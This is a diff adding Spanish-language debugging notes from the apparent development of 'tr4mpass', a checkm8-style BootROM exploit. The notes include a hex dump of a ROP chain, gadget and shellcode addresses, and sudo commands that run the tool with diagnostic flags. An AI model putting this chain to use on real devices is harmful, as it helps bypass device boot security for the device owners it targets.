@@ -1917,7 +1917,80 @@ Pero `buf[0x70]` y `buf[0x78]` están en **block1** del ROP chain. El bloque1 pa
 
 
 
+---
 
+## v1.0.45 — Block1 dump: todo correcto (2026-06-01 ~17:42-17:44)
+
+### Datos del log:
+```
+assemble_payload: block1 dump buf[0x60..0xBF]:
+  4C CC 00 00 01 00 00 00  A0 00 0B 80 01 00 00 00   ← slot4: func_gadget + next=0x1800B00A0
+  00 00 0B 80 01 00 00 00  E4 03 00 00 01 00 00 00   ← cb0: arg=0x1800B0000, func=write_ttbr0
+  00 00 00 00 00 00 00 00  34 04 00 00 01 00 00 00   ← cb1: arg=0, func=tlbi
+  00 00 00 00 00 00 00 00  10 06 0B 82 01 00 00 00   ← cb2: arg=0, func=exec_addr=0x1820B0610
+  00 00 0A 80 01 00 00 00  E4 03 00 00 01 00 00 00   ← cb3: arg=ttbr0_addr, func=write_ttbr0
+  00 00 00 00 00 00 00 00  34 04 00 00 01 00 00 00   ← cb4: arg=0, func=tlbi
+
+assemble_payload: cb0 arg=0x1800B0000 (want insec_mem=0x1800B0000) func=0x1000003E4 ✅
+assemble_payload: cb1 arg=0x0 (want 0) func=0x100000434 ✅
+```
+
+### Conclusión del block1 dump:
+**Todos los valores son correctos.** El ROP chain está ensamblado perfectamente. 
+El fallo no está en el layout de datos.
+
+### ¿Por qué el canary 0x41 no aparece si los datos son correctos?
+
+Las únicas explicaciones restantes:
+
+**Hipótesis A**: `write_ttbr0 = 0x1000003E4` no es una función válida en este BootROM.
+El BLR a esa dirección ejecuta código arbitrario → crash antes del exec_addr.
+
+**Hipótesis B**: `tlbi = 0x100000434` causa un exception level fault.
+`TLBI VMALLE1` o similar puede no ser válido en EL3/EL1 según el modo del BootROM.
+
+**Hipótesis C**: `func_gadget` hace `LDP [X0, #0x70]` pero X0 en el BootROM no es
+`insecure_memory_base = 0x1800B0000`. Podría ser la dirección del struct en la heap real
+que fue liberada, que NO es `0x1800B0000`.
+
+---
+
+## v1.0.46 — Experimento CHECKM8_SKIP_MMU (implementado 2026-06-06)
+
+### Propósito:
+Eliminar write_ttbr0 y tlbi del ROP chain. Si el canary 0x41 aparece con SKIP_MMU
+pero no sin él → el problema está en write_ttbr0 o tlbi (Hipótesis A/B).
+Si TAMPOCO aparece con SKIP_MMU → el problema está antes (Hipótesis C: func_gadget dispatch).
+
+### Comandos a ejecutar en ambos devices:
+```bash
+# Test 1: DIAG + SKIP_MMU (exec_addr directo sin MMU switch)
+sudo CHECKM8_DIAG_SHELLCODE=1 CHECKM8_SKIP_MMU=1 ./tr4mpass
+
+# Test 2: Si canary aparece en Test 1, probar sin DIAG pero con SKIP_MMU
+sudo CHECKM8_SKIP_MMU=1 ./tr4mpass
+```
+
+### Con SKIP_MMU, el ROP chain es:
+```
+cb0: exec_addr = 0x1800B0610 (raw insecure_memory_base + rop_prefix_sz, sin TTBR0 remap)
+cb1..5: ret_gadget (no-op)
+```
+
+### Shellcode funciona sin MMU remap:
+El shellcode de diagnóstico escribe a gUSBSerialNumber via `str w1, [x0]` donde
+x0 = `0x180083CF8` (cargado desde el literal pool). Esa dirección es SRAM normal,
+accesible en la VA del BootROM sin necesidad de remapear con nuestra page table.
+
+### Resultado esperado:
+| Resultado | Diagnóstico |
+|-----------|-------------|
+| Canary 0x41 aparece con SKIP_MMU | write_ttbr0/tlbi addr incorrecta |
+| NO aparece con SKIP_MMU | func_gadget no llama cb0 correctamente |
+| Canary aparece sin DIAG (PWND?) | write_ttbr0/tlbi problema, pero shellcode funciona sin MMU |
+
+### Estado actual:
+- Pendiente de prueba en dispositivo
 
 
 
